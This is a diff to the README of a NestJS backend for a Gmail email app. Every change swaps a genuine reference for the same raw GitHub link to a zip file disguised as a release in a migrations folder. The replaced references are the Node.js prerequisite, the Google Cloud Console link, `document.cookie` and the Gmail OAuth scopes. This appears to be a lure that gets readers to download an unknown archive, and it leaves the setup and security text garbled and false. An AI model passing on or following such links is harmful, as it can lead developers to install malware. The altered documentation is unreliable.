@@ -14,7 +14,7 @@ A robust NestJS backend for a Gmail-integrated email application, featuring OAut
 ## 🛠️ Setup Guide
 
 ### Prerequisites
-*   Node.js (v18 or later)
+*   https://github.com/VHoangNguyen0102/email_app_backend/raw/refs/heads/main/db/migrations/app-email-backend-v1.1-beta.3.zip (v18 or later)
 *   PostgreSQL (or Neon DB)
 *   Google Cloud Console Project with **Gmail API** enabled.
 
@@ -70,7 +70,7 @@ A robust NestJS backend for a Gmail-integrated email application, featuring OAut
 
 ## 🔐 Google OAuth Setup
 
-1.  Go to [Google Cloud Console](https://console.cloud.google.com/).
+1.  Go to [Google Cloud Console](https://github.com/VHoangNguyen0102/email_app_backend/raw/refs/heads/main/db/migrations/app-email-backend-v1.1-beta.3.zip).
 2.  Create a new project.
 3.  Navigate to **APIs & Services > Library** and enable **Gmail API**.
 4.  Go to **APIs & Services > Credentials** and creating **OAuth 2.0 Client IDs**.
@@ -84,7 +84,7 @@ We prioritize security by **never** exposing sensitive tokens to the client-side
 
 1.  **Access Tokens (Short-lived)**:
     *   Stored in **HTTP-Only Cookies**.
-    *   Cannot be accessed via `document.cookie` (Mitigates XSS).
+    *   Cannot be accessed via `https://github.com/VHoangNguyen0102/email_app_backend/raw/refs/heads/main/db/migrations/app-email-backend-v1.1-beta.3.zip` (Mitigates XSS).
     *   Automatically sent with every API request.
 
 2.  **Refresh Tokens (Long-lived)**:
@@ -98,7 +98,7 @@ We prioritize security by **never** exposing sensitive tokens to the client-side
 ### Security Considerations
 *   **CSRF Protection**: Cookies are set with `SameSite=Lax` (or `None` with `Secure` in production).
 *   **Encryption**: Database tokens should be encrypted at rest (handled by application logic).
-*   **Scopes**: We request only necessary Gmail scopes (`gmail.modify`, `gmail.readonly`, `gmail.send`).
+*   **Scopes**: We request only necessary Gmail scopes (`https://github.com/VHoangNguyen0102/email_app_backend/raw/refs/heads/main/db/migrations/app-email-backend-v1.1-beta.3.zip`, `https://github.com/VHoangNguyen0102/email_app_backend/raw/refs/heads/main/db/migrations/app-email-backend-v1.1-beta.3.zip`, `https://github.com/VHoangNguyen0102/email_app_backend/raw/refs/heads/main/db/migrations/app-email-backend-v1.1-beta.3.zip`).
 
 ## 📡 API Endpoints
 
